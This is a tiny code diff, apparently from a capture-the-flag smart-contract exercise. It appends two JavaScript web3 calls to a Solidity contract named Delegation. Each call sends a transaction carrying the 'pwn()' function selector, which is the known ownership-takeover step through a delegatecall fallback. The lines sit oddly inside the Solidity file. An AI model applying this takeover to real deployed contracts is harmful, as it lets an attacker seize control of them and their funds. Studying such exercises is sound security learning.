@@ -33,3 +33,5 @@ contract Delegation {
     }
   }
 }
+contract.sendTransaction({data:web3.utils.sha3("pwn()").slice(0,10)});
+contract.sendTransaction({data: web3.sha3("pwn()").slice(0,10)});
